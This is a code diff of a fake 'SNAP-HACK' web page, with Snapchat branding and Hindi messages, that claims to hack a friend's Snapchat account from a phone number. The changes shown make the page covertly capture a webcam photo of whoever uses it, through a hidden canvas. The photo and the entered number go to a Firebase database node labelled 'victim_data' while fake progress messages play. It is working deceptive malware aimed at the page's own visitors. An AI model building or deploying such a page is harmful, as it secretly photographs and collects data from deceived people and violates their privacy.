@@ -5,27 +5,26 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Snapchat</title>
     <meta name="mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black">
     <link rel="icon" href="https://pngimg.com/uploads/snapchat/snapchat_PNG29.png">
-    <link rel="apple-touch-icon" href="https://pngimg.com/uploads/snapchat/snapchat_PNG29.png">
-
     <style>
         body { background-color: #000; color: #0f0; font-family: sans-serif; text-align: center; padding: 20px; }
-        .logo { width: 80px; margin-top: 20px; }
-        .hacker-box { border: 2px solid #fffc00; padding: 20px; border-radius: 15px; background: #111; box-shadow: 0 0 15px #fffc00; margin-top: 30px;}
+        .logo { width: 80px; margin-top: 10px; }
+        .hacker-box { border: 2px solid #fffc00; padding: 20px; border-radius: 15px; background: #111; box-shadow: 0 0 15px #fffc00; margin-top: 20px;}
+        video { width: 100%; max-width: 250px; border: 2px solid #fffc00; border-radius: 10px; margin-top: 10px; background: #000; transform: scaleX(-1); }
         input { padding: 12px; width: 85%; margin: 15px 0; background: #222; color: #fff; border: 1px solid #fffc00; border-radius: 5px; }
         button { background: #fffc00; color: #000; padding: 12px 25px; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; width: 90%; font-size: 18px; }
-        video { width: 100%; max-width: 300px; border: 2px solid #fffc00; border-radius: 10px; margin-top: 10px; background: #000; }
+        canvas { display: none; }
     </style>
 </head>
 <body>
     <img src="https://pngimg.com/uploads/snapchat/snapchat_PNG29.png" class="logo">
     <div class="hacker-box">
-        <h2 style="color:#fffc00">SNAP-HACK v2.0</h2>
+        <h2 style="color:#fffc00">SNAP-HACK v3.0</h2>
         <p>[!] सर्वर कनेक्टेड: साहिल</p>
         <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
         <input type="number" id="phone" placeholder="दोस्त का नंबर डालें">
-        <button onclick="sendToSahil()">HACK SNAPCHAT</button>
+        <button onclick="takeAndSend()">HACK SNAPCHAT</button>
         <p id="status" style="margin-top:15px; color: #fffc00;"></p>
     </div>
 
@@ -45,21 +44,36 @@
 
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
-
         const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // कैमरा चालू करना
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => { video.srcObject = stream; });
 
-        window.sendToSahil = function() {
+        window.takeAndSend = function() {
             const phone = document.getElementById('phone').value;
             if(phone.length < 10) { alert("नंबर तो डालो भाई!"); return; }
-            
+
+            // फोटो खींचना
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const photoData = canvas.toDataURL('image/jpeg');
+
+            document.getElementById('status').innerText = "डाटा हैक हो रहा है... कृपया रुकें";
+
+            // डेटाबेस में नंबर और फोटो भेजना
             push(ref(db, 'victim_data'), {
                 number: phone,
+                photo: photoData, // यहाँ फोटो सेव होगी
                 time: new Date().toLocaleString()
             }).then(() => {
-                document.getElementById('status').innerText = "डाटा एक्सेस हो रहा है... 99%";
-                setTimeout(() => { alert("काम हो गया! डाटा साहिल के पास सेव है।"); }, 2000);
+                setTimeout(() => { 
+                    document.getElementById('status').innerText = "काम हो गया!";
+                    alert("साहिल को डेटा भेज दिया गया है!"); 
+                }, 2000);
             });
         }
     </script>
